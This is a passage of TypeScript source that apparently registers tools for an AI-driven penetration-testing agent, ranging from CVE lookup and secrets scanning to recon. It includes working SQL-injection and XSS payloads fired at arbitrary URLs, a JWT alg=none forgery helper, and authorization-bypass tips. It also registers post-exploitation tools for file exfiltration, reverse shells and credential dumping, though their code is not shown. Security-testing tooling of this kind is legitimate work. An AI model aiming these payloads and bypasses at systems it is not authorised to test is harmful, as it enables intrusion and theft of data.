      const cvss = cve.metrics?.cvssMetricV31?.[0]?.cvssData || cve.metrics?.cvssMetricV30?.[0]?.cvssData;
      const epss = epssData.data?.[0];
      return `CVE: ${cveId}\n\nDescription: ${desc.slice(0, 500)}\n\nCVSS: ${cvss ? `${cvss.baseScore} (${cvss.baseSeverity}) - ${cvss.vectorString}` : 'Not rated'}\nEPSS: ${epss ? `${(parseFloat(epss.epss) * 100).toFixed(2)}% exploit probability (percentile: ${(parseFloat(epss.percentile) * 100).toFixed(1)}%)` : 'No EPSS data'}\n\nReferences:\n${(cve.references || []).slice(0, 5).map((r: Record<string, string>) => `- ${r.url}`).join('\n')}`;
    } catch (error) { return `Error looking up ${cveId}: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'cve_lookup', description: 'Look up CVE details from NVD', schema: CveLookupSchema }),
});

const DepEnrichSchema = z.object({ path: z.string().describe('File path to lockfile (package-lock.json, requirements.txt, go.sum)') });

toolRegistry.register({
  name: 'dependency_enrich',
  category: 'vuln-intel',
  description: 'Parse dependency lockfiles (package-lock.json, requirements.txt, go.sum) and enrich with CVE data',
  tags: ['dependencies', 'cve', 'sca', 'lockfile'],
  factory: () => tool(async (input) => {
    const { path: lockfilePath } = DepEnrichSchema.parse(input);
    const fs = await import('fs');
    try {
      const content = fs.readFileSync(lockfilePath, 'utf-8');
      const deps: Array<{ name: string; version: string }> = [];
      if (lockfilePath.endsWith('package-lock.json')) {
        const parsed = JSON.parse(content);
        for (const [name, info] of Object.entries(parsed.packages || {})) {
          if (name && (info as Record<string, string>).version) deps.push({ name, version: (info as Record<string, string>).version });
        }
      } else if (lockfilePath.endsWith('requirements.txt')) {
        for (const line of content.split('\n')) {
          const match = line.match(/^([a-zA-Z0-9_-]+)==([^\s#]+)/);
          if (match) deps.push({ name: match[1], version: match[2] });
        }
      } else if (lockfilePath.endsWith('go.sum')) {
        for (const line of content.split('\n')) {
          const match = line.match(/^([^\s]+)\s+([^\s]+)/);
          if (match) deps.push({ name: match[1], version: match[2].replace('/go.mod', '') });
        }
      }
      return `Found ${deps.length} dependencies in ${lockfilePath}:\n\n${deps.slice(0, 30).map((d) => `- ${d.name}@${d.version}`).join('\n')}\n\nUse cve_lookup to check specific packages for known vulnerabilities.`;
    } catch (error) { return `Error: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'dependency_enrich', description: 'Parse lockfiles and list dependencies', schema: DepEnrichSchema }),
});

// ── Code Analysis Tools ──

const EntryPointSchema = z.object({ path: z.string().describe('File system path to scan for entry points') });

toolRegistry.register({
  name: 'entry_point_detect',
  category: 'code',
  description: 'Identify HTTP route handlers, CLI entry points, WebSocket handlers, and file/stdin readers',
  tags: ['code', 'entry-points', 'routes', 'analysis'],
  factory: () => tool(async (input) => {
    const { path: scanPath } = EntryPointSchema.parse(input);
    const fs = await import('fs');
    const pathModule = await import('path');
    const files = getAllFiles(scanPath);
    const patterns = [
      { name: 'Express route', regex: /app\.(get|post|put|delete|patch|all)\s*\(/i, category: 'http' },
      { name: 'Fastify route', regex: /fastify\.(get|post|put|delete|patch)\s*\(/i, category: 'http' },
      { name: 'Next.js API', regex: /export\s+(default\s+)?async\s+function\s+(GET|POST|PUT|DELETE|PATCH)/i, category: 'http' },
      { name: 'Flask route', regex: /@app\.route\s*\(/i, category: 'http' },
      { name: 'Django URL', regex: /path\s*\(|re_path\s*\(/i, category: 'http' },
      { name: 'Go HTTP handler', regex: /http\.HandleFunc\s*\(|http\.Handle\s*\(/i, category: 'http' },
      { name: 'WebSocket', regex: /ws\.on\s*\(|socket\.on\s*\(|WebSocket/i, category: 'websocket' },
      { name: 'CLI entry', regex: /process\.argv|sys\.argv|os\.Args|argparse/i, category: 'cli' },
      { name: 'File reader', regex: /fs\.readFile|open\s*\(|io\.open|File\.read/i, category: 'file' },
    ];
    const findings: Array<{ file: string; line: number; pattern: string; category: string }> = [];
    for (const file of files.slice(0, 200)) {
      try {
        const content = fs.readFileSync(file, 'utf-8');
        const lines = content.split('\n');
        for (const pattern of patterns) {
          for (let i = 0; i < lines.length; i++) {
            if (pattern.regex.test(lines[i])) {
              findings.push({ file: pathModule.relative(scanPath, file), line: i + 1, pattern: pattern.name, category: pattern.category });
            }
          }
        }
      } catch { /* skip */ }
    }
    const byCategory: Record<string, number> = {};
    for (const f of findings) byCategory[f.category] = (byCategory[f.category] || 0) + 1;
    return `Entry Points in ${scanPath}:\n\nBy category:\n${Object.entries(byCategory).map(([cat, count]) => `- ${cat}: ${count}`).join('\n')}\n\nTotal: ${findings.length}\n\nTop 20:\n${findings.slice(0, 20).map((f) => `- [${f.category}] ${f.file}:${f.line} - ${f.pattern}`).join('\n')}`;
  }, { name: 'entry_point_detect', description: 'Identify application entry points', schema: EntryPointSchema }),
});

const SourceSinkSchema = z.object({ path: z.string().describe('File system path to scan for sources and sinks') });

toolRegistry.register({
  name: 'source_sink_scan',
  category: 'code',
  description: 'Scan for data flow sources (user input) and sinks (dangerous functions) across large codebases',
  tags: ['code', 'dataflow', 'sources', 'sinks'],
  factory: () => tool(async (input) => {
    const { path: scanPath } = SourceSinkSchema.parse(input);
    const fs = await import('fs');
    const pathModule = await import('path');
    const sources = [
      { name: 'HTTP request body', regex: /req\.body|request\.body|request\.json/i },
      { name: 'HTTP query params', regex: /req\.query|request\.args|request\.GET/i },
      { name: 'HTTP headers', regex: /req\.headers|request\.headers/i },
      { name: 'URL params', regex: /req\.params|request\.match_info/i },
      { name: 'File input', regex: /fs\.readFile|open\s*\(|io\.open/i },
      { name: 'Environment vars', regex: /process\.env|os\.environ|os\.getenv/i },
    ];
    const sinks = [
      { name: 'SQL execution', regex: /(?:query|execute|exec)\s*\(/i, severity: 'critical' },
      { name: 'Command execution', regex: /(?:exec|spawn|execSync|system|subprocess)/i, severity: 'critical' },
      { name: 'eval/exec', regex: /(?:eval|exec|Function\s*\()\s*\(/i, severity: 'critical' },
      { name: 'HTML output', regex: /res\.write|res\.send|innerHTML|document\.write/i, severity: 'high' },
      { name: 'File write', regex: /fs\.writeFile|open\s*\(.*['"]w['"]|file\.write/i, severity: 'high' },
      { name: 'Redirect', regex: /res\.redirect|Response\.redirect/i, severity: 'medium' },
      { name: 'Deserialization', regex: /JSON\.parse|pickle\.loads|yaml\.load|unserialize/i, severity: 'high' },
    ];
    const files = getAllFiles(scanPath);
    const sourceHits: Array<{ file: string; line: number; name: string }> = [];
    const sinkHits: Array<{ file: string; line: number; name: string; severity: string }> = [];
    for (const file of files.slice(0, 500)) {
      try {
        const content = fs.readFileSync(file, 'utf-8');
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          for (const source of sources) { if (source.regex.test(lines[i])) sourceHits.push({ file: pathModule.relative(scanPath, file), line: i + 1, name: source.name }); }
          for (const sink of sinks) { if (sink.regex.test(lines[i])) sinkHits.push({ file: pathModule.relative(scanPath, file), line: i + 1, name: sink.name, severity: sink.severity }); }
        }
      } catch { /* skip */ }
    }
    return `Source/Sink Analysis for ${scanPath}:\n\nSources (user input): ${sourceHits.length}\n${sourceHits.slice(0, 10).map((s) => `- ${s.file}:${s.line} - ${s.name}`).join('\n')}\n\nSinks (dangerous functions): ${sinkHits.length}\n${sinkHits.slice(0, 10).map((s) => `- [${s.severity}] ${s.file}:${s.line} - ${s.name}`).join('\n')}\n\n⚠️ Potential data flow vulnerabilities: Check if any source flows to a sink without sanitization.`;
  }, { name: 'source_sink_scan', description: 'Scan for data flow sources and sinks', schema: SourceSinkSchema }),
});

const ReachabilitySchema = z.object({ path: z.string().describe('File system path to scan'), entryPoint: z.string().describe('Function name of the entry point'), sink: z.string().describe('Function name of the vulnerable sink') });

toolRegistry.register({
  name: 'reachability_analyze',
  category: 'code',
  description: 'Analyze if a vulnerable sink is reachable from an entry point (reduces false positives)',
  tags: ['code', 'reachability', 'dataflow', 'false-positive'],
  factory: () => tool(async (input) => {
    const { path: scanPath, entryPoint, sink } = ReachabilitySchema.parse(input);
    const fs = await import('fs');
    const files = getAllFiles(scanPath);
    const callGraph: Array<{ from: string; to: string; file: string; line: number }> = [];
    for (const file of files.slice(0, 200)) {
      try {
        const content = fs.readFileSync(file, 'utf-8');
        const lines = content.split('\n');
        const funcName = content.match(/function\s+(\w+)/)?.[1];
        for (let i = 0; i < lines.length; i++) {
          const calls = lines[i].match(/(\w+)\s*\(/g);
          if (calls && funcName) {
            for (const call of calls) {
              const called = call.replace(/\s*\($/, '');
              if (called !== funcName && called.length > 2) callGraph.push({ from: funcName, to: called, file, line: i + 1 });
            }
          }
        }
      } catch { /* skip */ }
    }
    const reachable = bfsReach(callGraph, entryPoint, sink);
    return reachable ? `✅ REACHABLE: ${entryPoint} → ... → ${sink}\n\nThe sink IS reachable from the entry point through ${reachable.length} function calls.\nThis vulnerability is LIKELY exploitable.\n\nPath: ${reachable.map((r) => `${r.from}() →`).join(' ')} ${sink}()` : `❌ NOT REACHABLE: No call path found from ${entryPoint} to ${sink}\n\nThis may be a false positive — the sink exists but is not reachable from user input.`;
  }, { name: 'reachability_analyze', description: 'Analyze sink reachability from entry points', schema: ReachabilitySchema }),
});

toolRegistry.register({
  name: 'finding_verify',
  category: 'code',
  description: 'LLM-driven false positive elimination — verify if a reported vulnerability is actually exploitable',
  tags: ['verification', 'false-positive', 'llm', 'analysis'],
  factory: () => tool(async (input) => {
    const { finding, codeSnippet } = z.object({ finding: z.string().describe('Description of the vulnerability finding to verify'), codeSnippet: z.string().describe('Relevant source code snippet showing the finding') }).parse(input);
    return `Verification analysis for: ${finding}\n\nCode: ${codeSnippet.slice(0, 500)}\n\nAnalysis:\n1. Check if input is sanitized before reaching the sink\n2. Check if there are middleware/WAF protections\n3. Check if the sink is actually reachable from user-controlled input\n4. Check if there are type constraints that prevent exploitation\n\nResult: Requires LLM analysis — use the main agent to evaluate this finding against the code context.`;
  }, { name: 'finding_verify', description: 'Verify vulnerability findings', schema: z.object({ finding: z.string().describe('Vulnerability description'), codeSnippet: z.string().describe('Source code snippet') }) }),
});

// ── Exploit Testing Tools ──

const SqlInjectSchema = z.object({ url: z.string().describe('Target URL with vulnerable parameter'), paramName: z.string().optional().describe('Query/body parameter name to test for SQL injection (e.g. "id", "username"). If omitted, auto-detected from URL or common parameters.'), method: z.string().optional().default('GET').describe('HTTP method') });

toolRegistry.register({
  name: 'sql_inject',
  category: 'exploit',
  description: 'Test parameters for SQL injection using safe, non-destructive payloads',
  tags: ['sqli', 'injection', 'exploit', 'testing'],
  factory: () => tool(async (input) => {
    const { url, paramName, method } = SqlInjectSchema.parse(u(input));
    const params = paramName ? [paramName] : (() => {
      const qs = url.includes('?') ? new URL(url).searchParams : null;
      return qs && qs.size > 0 ? Array.from(qs.keys()).filter(k => k !== 'utm_source' && k !== 'utm_medium') : ['q', 'id', 'search', 'name'];
    })();
    const payloads = [
      { payload: "' OR 1=1--", desc: 'Boolean-based blind' },
      { payload: "' UNION SELECT NULL--", desc: 'UNION-based' },
      { payload: "'; WAITFOR DELAY '0:0:5'--", desc: 'Time-based blind' },
      { payload: "' AND SLEEP(5)--", desc: 'Time-based (MySQL)' },
      { payload: "1' ORDER BY 1--", desc: 'ORDER BY enumeration' },
    ];
    const results: Array<{ desc: string; payload: string; status: number; time: number; indicator: string }> = [];
    for (const p of params) {
      for (const { payload, desc } of payloads) {
        const start = Date.now();
        try {
          const testUrl = method === 'GET' ? `${url}${url.includes('?') ? '&' : '?'}${p}=${encodeURIComponent(payload)}` : url;
          const res = await fetch(testUrl, { method, headers: method === 'POST' ? { 'Content-Type': 'application/x-www-form-urlencoded' } : {}, body: method === 'POST' ? `${p}=${encodeURIComponent(payload)}` : undefined });
          const text = await res.text();
          const time = Date.now() - start;
          let indicator = 'No obvious SQLi indicator';
          if (text.toLowerCase().includes('sql syntax') || text.toLowerCase().includes('sql error')) indicator = '⚠️ SQL error message detected';
          if (text.toLowerCase().includes('warning') && text.toLowerCase().includes('mysql')) indicator = '⚠️ MySQL warning detected';
          if (time > 4000) indicator = '⚠️ Time delay detected — possible blind SQLi';
          results.push({ desc, payload, status: res.status, time, indicator });
        } catch (error) { results.push({ desc, payload, status: 0, time: Date.now() - start, indicator: `Error: ${error instanceof Error ? error.message : String(error)}` }); }
      }
    }
    const paramLabel = params.join(', ');
    return `SQL Injection Test for ${method} ${url}?${paramLabel}=...\n\n${results.map((r) => `- [${r.desc}] ${r.payload.slice(0, 30)}\n  Status: ${r.status}, Time: ${r.time}ms\n  ${r.indicator}`).join('\n\n')}`;
  }, { name: 'sql_inject', description: 'Test for SQL injection', schema: SqlInjectSchema }),
});

const XssInjectSchema = z.object({ url: z.string().describe('Target URL with vulnerable parameter'), paramName: z.string().optional().describe('Query/body parameter name to test for XSS (e.g. "q", "search", "name"). If omitted, auto-detected from URL or common parameters.'), method: z.string().optional().default('GET').describe('HTTP method') });

toolRegistry.register({
  name: 'xss_inject',
  category: 'exploit',
  description: 'Test parameters for XSS using safe payloads that detect reflection without executing',
  tags: ['xss', 'injection', 'exploit', 'testing'],
  factory: () => tool(async (input) => {
    const { url, paramName, method } = XssInjectSchema.parse(u(input));
    const payloads = [
      { payload: '<script>alert(1)</script>', desc: 'Basic reflected XSS' },
      { payload: '<img src=x onerror=alert(1)>', desc: 'Event handler XSS' },
      { payload: '"><script>alert(1)</script>', desc: 'Attribute break XSS' },
      { payload: "javascript:alert(1)", desc: 'JavaScript URI' },
      { payload: '<svg onload=alert(1)>', desc: 'SVG-based XSS' },
    ];
    const results: Array<{ desc: string; reflected: boolean; encoded: boolean; status: number }> = [];
    for (const { payload, desc } of payloads) {
      try {
        const testUrl = method === 'GET' ? `${url}${url.includes('?') ? '&' : '?'}${paramName}=${encodeURIComponent(payload)}` : url;
        const res = await fetch(testUrl, { method, body: method === 'POST' ? `${paramName}=${encodeURIComponent(payload)}` : undefined });
        const text = await res.text();
        const reflected = text.includes(payload);
        const encoded = text.includes(encodeURIComponent(payload).replace(/%/g, '%25')) || text.includes('&lt;script');
        results.push({ desc, reflected, encoded, status: res.status });
      } catch { results.push({ desc, reflected: false, encoded: false, status: 0 }); }
    }
    const vulnerable = results.filter((r) => r.reflected && !r.encoded);
    return `XSS Test for ${method} ${url}?${paramName}=...\n\n${results.map((r) => `- [${r.desc}] Reflected: ${r.reflected}, Encoded: ${r.encoded}, Status: ${r.status}`).join('\n')}\n\n${vulnerable.length > 0 ? `⚠️ VULNERABLE: ${vulnerable.length} payloads reflected without encoding` : '✅ No reflected XSS detected — payloads were encoded or not reflected'}`;
  }, { name: 'xss_inject', description: 'Test for XSS vulnerabilities', schema: XssInjectSchema }),
});

toolRegistry.register({
  name: 'exploit_auth_bypass',
  category: 'exploit',
  description: 'Test authentication bypass techniques (JWT alg=none, weak secrets, algorithm confusion)',
  tags: ['auth', 'bypass', 'jwt', 'exploit'],
  factory: () => tool(async (input) => {
    const { url, token } = z.object({
      url: z.string().describe('Target URL to test auth bypass on'),
      token: z.string().optional().describe('Existing JWT token to analyze'),
    }).parse(u(input));
    const tests: Array<{ name: string; result: string }> = [];
    if (token) {
      const parts = token.split('.');
      if (parts.length === 3) {
        const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
        if (header.alg === 'HS256') {
          tests.push({ name: 'HS256 → none attack', result: 'Token uses HS256 — try changing alg to none and removing signature' });
        }
        tests.push({ name: 'alg=none forgery', result: `Forge with alg=none: ${Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url')}.${parts[1]}.` });
      }
    }
    tests.push({ name: 'Header injection', result: `Try: X-Original-URL: /admin, X-Rewrite-URL: /admin, X-Forwarded-For: 127.0.0.1` });
    tests.push({ name: 'HTTP method override', result: `Try: X-HTTP-Method-Override: PUT, X-Method-Override: DELETE` });
    return `Auth Bypass Tests for ${url}:\n\n${tests.map((t) => `- ${t.name}: ${t.result}`).join('\n\n')}`;
  }, { name: 'exploit_auth_bypass', description: 'Test authentication bypass techniques', schema: z.object({ url: z.string().describe('Target URL to test auth bypass on'), token: z.string().optional().describe('Existing JWT token to analyze') }) }),
});

toolRegistry.register({
  name: 'exploit_authz',
  category: 'exploit',
  description: 'Test authorization bypass (IDOR, privilege escalation, mass assignment)',
  tags: ['authz', 'idor', 'privilege-escalation', 'exploit'],
  factory: () => tool(async (input) => {
    const { url, authToken, targetId } = z.object({
      url: z.string().describe('Target API endpoint URL for authorization test'),
      authToken: z.string().describe('Authentication token to use for requests'),
      targetId: z.string().describe('Target resource ID to test authorization for'),
    }).parse(u(input));
    const tests: Array<{ name: string; result: string }> = [];
    tests.push({ name: 'IDOR test', result: `GET ${url}/${targetId} with your token — if you get data for ${targetId}, it's vulnerable` });
    tests.push({ name: 'Horizontal escalation', result: `Change user ID in request body/URL to another user's ID` });
    tests.push({ name: 'Vertical escalation', result: `Add role: "admin" or isAdmin: true to request body` });
    tests.push({ name: 'Mass assignment', result: `Add unexpected fields: __proto__, constructor, prototype to request body` });
    return `Authorization Bypass Tests for ${url}:\n\n${tests.map((t) => `- ${t.name}: ${t.result}`).join('\n\n')}\n\nUse your auth token: ${authToken.slice(0, 20)}...`;
  }, { name: 'exploit_authz', description: 'Test authorization bypass', schema: z.object({ url: z.string().describe('Target API endpoint URL for authorization test'), authToken: z.string().describe('Authentication token to use for requests'), targetId: z.string().describe('Target resource ID to test authorization for') }) }),
});

// ── Reconnaissance Tools ──

const SubdomainEnumSchema = z.object({ domain: z.string().describe('Domain name to enumerate subdomains for (e.g. example.com)') });

toolRegistry.register({
  name: 'subdomain_enum',
  category: 'recon',
  description: 'Enumerate subdomains via passive sources (crt.sh, securitytrails, hackertarget)',
  tags: ['subdomain', 'recon', 'dns', 'enumeration'],
  factory: () => tool(async (input) => {
    const { domain } = SubdomainEnumSchema.parse(input);
    const sources = [
      { name: 'crt.sh', url: `https://crt.sh/?q=${domain}&output=json` },
      { name: 'hackertarget', url: `https://api.hackertarget.com/hostsearch/?q=${domain}` },
    ];
    const subdomains = new Set<string>();
    for (const source of sources) {
      try {
        const res = await fetch(source.url);
        const text = await res.text();
        if (source.name === 'crt.sh') {
          const certs = JSON.parse(text);
          for (const cert of certs) {
            const names = (cert.name_value || '').split('\n');
            for (const name of names) {
              if (name.endsWith(domain) && !name.includes('*')) subdomains.add(name);
            }
          }
        } else {
          for (const line of text.split('\n')) {
            const parts = line.split(',');
            if (parts[0]?.endsWith(domain)) subdomains.add(parts[0]);
          }
        }
      } catch { /* skip failed sources */ }
    }
    return `Subdomains for ${domain}:\n\n${Array.from(subdomains).sort().map((s) => `- ${s}`).join('\n') || 'No subdomains found'}\n\nTotal: ${subdomains.size}`;
  }, { name: 'subdomain_enum', description: 'Enumerate subdomains via passive sources', schema: SubdomainEnumSchema }),
});

toolRegistry.register({
  name: 'dir_bruteforce',
  category: 'recon',
  description: 'Discover hidden directories and files via common wordlist probing',
  tags: ['directory', 'bruteforce', 'recon', 'enumeration'],
  factory: () => tool(async (input) => {
    const { url, wordlist } = z.object({
      url: z.string().describe('Target URL to discover hidden directories on'),
      wordlist: z.array(z.string()).optional().describe('Custom wordlist of paths/names to check'),
    }).parse(u(input));
    const commonPaths = wordlist || [
      'admin', 'login', 'api', 'debug', 'console', 'dashboard', 'config',
      'backup', 'db', 'database', 'test', 'staging', 'dev', '.env',
      '.git', '.git/config', 'wp-admin', 'phpmyadmin', 'server-status',
      'robots.txt', 'sitemap.xml', '.well-known', 'swagger', 'graphql',
    ];
    const found: Array<{ path: string; status: number; size: number }> = [];
    await Promise.all(commonPaths.map(async (path) => {
      try {
        const res = await fetch(`${url}/${path}`, { method: 'HEAD' });
        if (res.status !== 404 && res.status !== 403) found.push({ path, status: res.status, size: parseInt(res.headers.get('content-length') || '0') });
      } catch { /* skip */ }
    }));
    return `Directory brute force for ${url}:\n\nFound ${found.length} non-404 paths:\n${found.map((f) => `- [${f.status}] /${f.path} (${f.size} bytes)`).join('\n') || 'Nothing interesting found'}`;
  }, { name: 'dir_bruteforce', description: 'Discover hidden directories', schema: z.object({ url: z.string().describe('Target URL to discover hidden directories on'), wordlist: z.array(z.string()).optional().describe('Custom wordlist of paths/names to check') }) }),
});

// ── Secrets & SSL Tools ──

const SecretsScanSchema = z.object({ path: z.string().describe('File system path to scan for hardcoded secrets') });

toolRegistry.register({
  name: 'secrets_scan',
  category: 'code',
  description: 'Detect hardcoded secrets, API keys, tokens, and credentials in source code',
  tags: ['secrets', 'credentials', 'leak', 'scanning'],
  factory: () => tool(async (input) => {
    const { path: scanPath } = SecretsScanSchema.parse(input);
    const fs = await import('fs');
    const pathModule = await import('path');
    const patterns = [
      { name: 'AWS Access Key', regex: /AKIA[0-9A-Z]{16}/, severity: 'critical' },
      { name: 'AWS Secret Key', regex: /(?:aws_secret|AWS_SECRET)[\w\s:=]{0,10}[A-Za-z0-9/+=]{40}/, severity: 'critical' },
      { name: 'Generic API Key', regex: /(?:api[_-]?key|apikey)[\s:=]{0,5}['"]?[A-Za-z0-9_-]{16,}/i, severity: 'high' },
      { name: 'Private Key', regex: /-----BEGIN (?:RSA |EC )?PRIVATE KEY-----/, severity: 'critical' },
      { name: 'GitHub Token', regex: /ghp_[A-Za-z0-9]{36}/, severity: 'critical' },
      { name: 'Slack Token', regex: /xox[baprs]-[A-Za-z0-9-]+/, severity: 'high' },
      { name: 'Password assignment', regex: /(?:password|passwd|pwd)\s*[=:]\s*['"][^'"]{4,}['"]/i, severity: 'high' },
      { name: 'Connection string', regex: /(?:mongodb|postgres|mysql|redis):\/\/[^\s'"]+:[^\s'"]+@/i, severity: 'high' },
      { name: 'JWT Secret', regex: /(?:jwt|jwt_secret|jwt_key)\s*[=:]\s*['"][^'"]{8,}['"]/i, severity: 'high' },
    ];
    const files = getAllFiles(scanPath);
    const findings: Array<{ file: string; line: number; name: string; severity: string; code: string }> = [];
    for (const file of files.slice(0, 500)) {
      try {
        const content = fs.readFileSync(file, 'utf-8');
        const lines = content.split('\n');
        for (const pattern of patterns) {
          for (let i = 0; i < lines.length; i++) {
            if (pattern.regex.test(lines[i])) {
              findings.push({ file: pathModule.relative(scanPath, file), line: i + 1, name: pattern.name, severity: pattern.severity, code: lines[i].trim().slice(0, 120) });
            }
          }
        }
      } catch { /* skip */ }
    }
    return `Secrets Scan for ${scanPath}:\n\nFound ${findings.length} potential secrets:\n\n${findings.slice(0, 30).map((f) => `- [${f.severity}] ${f.file}:${f.line} - ${f.name}\n  ${f.code}`).join('\n\n') || 'No hardcoded secrets detected'}`;
  }, { name: 'secrets_scan', description: 'Detect hardcoded secrets in source code', schema: SecretsScanSchema }),
});

const SslCheckSchema = z.object({
  url: z.string().describe('Target URL to check SSL/TLS for'),
  target: z.string().optional().describe('Alias for url'),
}).transform(v => ({ url: v.url || v.target || '' }));

toolRegistry.register({
  name: 'ssl_check',
  category: 'network',
  description: 'Check SSL/TLS certificate validity, expiration, and configuration',
  tags: ['ssl', 'tls', 'certificate', 'network'],
  factory: () => tool(async (input) => {
    const { url } = SslCheckSchema.parse(u(input));
    try {
      const res = await fetch(url);
      const headers: Record<string, string> = {};
      res.headers.forEach((v, k) => { headers[k] = v; });
      const issues: string[] = [];
      if (!url.startsWith('https://')) issues.push('⚠️ Not using HTTPS');
      if (headers['strict-transport-security']) {
        const maxAge = headers['strict-transport-security'].match(/max-age=(\d+)/);
        if (maxAge && parseInt(maxAge[1]) < 31536000) issues.push('⚠️ HSTS max-age less than 1 year');
      } else issues.push('⚠️ Missing HSTS header');
      const tlsVersion = headers['x-protocol'] || 'unknown';
      return `SSL/TLS Check for ${url}:\n\nHTTPS: ${url.startsWith('https://') ? '✅ Yes' : '❌ No'}\nTLS Version: ${tlsVersion}\nHSTS: ${headers['strict-transport-security'] || '❌ Missing'}\n\nIssues:\n${issues.length > 0 ? issues.map((i) => `- ${i}`).join('\n') : 'No obvious SSL/TLS issues'}`;
    } catch (error) { return `Error: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'ssl_check', description: 'Check SSL/TLS configuration', schema: SslCheckSchema }),
});

// ── HTTP Fuzzing Tool ──

toolRegistry.register({
  name: 'http_fuzz',
  category: 'exploit',
  description: 'Fuzz HTTP endpoints with payload wordlists using FUZZ placeholder in URL, headers, or body',
  tags: ['fuzzing', 'http', 'exploit', 'wordlist'],
  factory: () => createHttpFuzzTool(),
});

// ── Template Scanning Tool ──

toolRegistry.register({
  name: 'template_scan',
  category: 'recon',
  description: 'Execute Nuclei-compatible YAML templates against a target URL for vulnerability detection',
  tags: ['template', 'nuclei', 'scanning', 'automation'],
  factory: () => createTemplateScanTool(),
});

// ── Container & Cloud Scanning Tools ──

toolRegistry.register({
  name: 'trivy_scan',
  category: 'cloud',
  description: 'Scan container images, filesystems, Kubernetes, or SBOMs for vulnerabilities using Trivy',
  tags: ['trivy', 'container', 'kubernetes', 'vulnerability', 'cloud'],
  factory: () => createTrivyTool(),
});

toolRegistry.register({
  name: 'semgrep_scan',
  category: 'code',
  description: 'Scan source code for security vulnerabilities using Semgrep SAST rules',
  tags: ['semgrep', 'sast', 'code', 'static-analysis'],
  factory: () => createSemgrepTool(),
});

// ── Browser Control Tools ──

toolRegistry.register({
  name: 'browser_navigate',
  category: 'browser',
  description: 'Navigate a browser session to a URL',
  tags: ['browser', 'playwright', 'navigation'],
  factory: () => createBrowserNavigateTool(),
});

toolRegistry.register({
  name: 'browser_click',
  category: 'browser',
  description: 'Click an element identified by CSS selector in a browser session',
  tags: ['browser', 'playwright', 'dom', 'interaction'],
  factory: () => createBrowserClickTool(),
});

toolRegistry.register({
  name: 'browser_fill',
  category: 'browser',
  description: 'Fill a form field with a value in a browser session',
  tags: ['browser', 'playwright', 'form', 'input'],
  factory: () => createBrowserFillTool(),
});

toolRegistry.register({
  name: 'browser_press_key',
  category: 'browser',
  description: 'Press a keyboard key in the browser session (e.g. "Enter", "Escape", "Tab", "ArrowDown", "Control+a"). Use after browser_fill to submit forms/chat messages.',
  tags: ['browser', 'playwright', 'keyboard', 'form', 'submit'],
  factory: () => createBrowserPressKeyTool(),
});

toolRegistry.register({
  name: 'browser_screenshot',
  category: 'browser',
  description: 'Take a screenshot of the current page in a browser session (returns base64 PNG)',
  tags: ['browser', 'playwright', 'screenshot', 'visual'],
  factory: () => createBrowserScreenshotTool(),
});

toolRegistry.register({
  name: 'browser_extract',
  category: 'browser',
  description: 'Extract content from the current page in a browser session (text, html, or links)',
  tags: ['browser', 'playwright', 'dom', 'extraction'],
  factory: () => createBrowserExtractTool(),
});

toolRegistry.register({
  name: 'browser_evaluate',
  category: 'browser',
  description: 'Execute JavaScript in the browser session page context',
  tags: ['browser', 'playwright', 'javascript', 'evaluation'],
  factory: () => createBrowserEvaluateTool(),
});

toolRegistry.register({
  name: 'browser_close',
  category: 'browser',
  description: 'Close a browser session and release all resources',
  tags: ['browser', 'playwright', 'session', 'cleanup'],
  factory: () => createBrowserCloseTool(),
});

toolRegistry.register({
  name: 'browser_start_recording',
  category: 'browser',
  description: 'Start recording browser actions (navigate, click, fill) for later Playwright test generation',
  tags: ['browser', 'playwright', 'recording', 'test-generation'],
  factory: () => createBrowserStartRecordingTool(),
});

toolRegistry.register({
  name: 'browser_stop_recording',
  category: 'browser',
  description: 'Stop recording browser actions and return the recorded steps',
  tags: ['browser', 'playwright', 'recording', 'test-generation'],
  factory: () => createBrowserStopRecordingTool(),
});

toolRegistry.register({
  name: 'browser_get_recording',
  category: 'browser',
  description: 'Get the current recorded actions for a browser session without stopping recording',
  tags: ['browser', 'playwright', 'recording', 'test-generation'],
  factory: () => createBrowserGetRecordingTool(),
});

toolRegistry.register({
  name: 'generate_playwright_test',
  category: 'utility',
  description: 'Generate Playwright test files from recorded browser session actions. Start recording first with browser_start_recording, perform actions, then call this.',
  tags: ['playwright', 'test-generation', 'testing', 'browser'],
  factory: () => createGeneratePlaywrightTestTool(),
});

toolRegistry.register({
  name: 'browser_start_trace',
  category: 'browser',
  description: 'Start automatic network request tracing on a browser session. Captures all XHR, fetch, navigation, form submits with headers and payloads.',
  tags: ['browser', 'trace', 'network', 'recon'],
  factory: () => createBrowserStartTraceTool(),
});

toolRegistry.register({
  name: 'browser_stop_trace',
  category: 'browser',
  description: 'Stop network tracing and return summary of captured entries.',
  tags: ['browser', 'trace', 'network', 'recon'],
  factory: () => createBrowserStopTraceTool(),
});

toolRegistry.register({
  name: 'browser_get_trace',
  category: 'browser',
  description: 'Show captured network trace entries with URLs, methods, status codes, and types.',
  tags: ['browser', 'trace', 'network', 'recon'],
  factory: () => createBrowserGetTraceTool(),
});

// ── Authenticated Scanning Tools ──

toolRegistry.register({
  name: 'browser_record_login',
  category: 'auth',
  description: 'Record and replay a login macro through the browser for authenticated scanning sessions',
  tags: ['auth', 'login', 'macro', 'session', 'browser'],
  factory: () => {
    const { BrowserSessionManager: BSM } = { BrowserSessionManager };
    const mac = createLoginMacroTool(new BSM());
    return mac;
  },
});

toolRegistry.register({
  name: 'check_auth_session',
  category: 'auth',
  description: 'Check if an authentication session (cookie or header) is valid against a target URL',
  tags: ['auth', 'session', 'check', 'validation'],
  factory: () => createSessionCheckTool(),
});

// ── Post-Exploitation Tools ──

toolRegistry.register({
  name: 'exfiltrate_file',
  category: 'exploit',
  description: 'Generate commands to exfiltrate files from a compromised target via shell, SQL, or LFI',
  tags: ['exploit', 'exfil', 'post-exploitation', 'data'],
  factory: () => createFileExfilTool(),
});

toolRegistry.register({
  name: 'reverse_shell',
  category: 'exploit',
  description: 'Generate reverse shell payload commands for various shell types (bash, python, nc, powershell)',
  tags: ['exploit', 'reverse-shell', 'rce', 'payload'],
  factory: () => createReverseShellTool(),
});

toolRegistry.register({
  name: 'dump_credentials',
  category: 'exploit',
  description: 'Generate credential dumping commands for Unix, Windows, web apps, and databases',
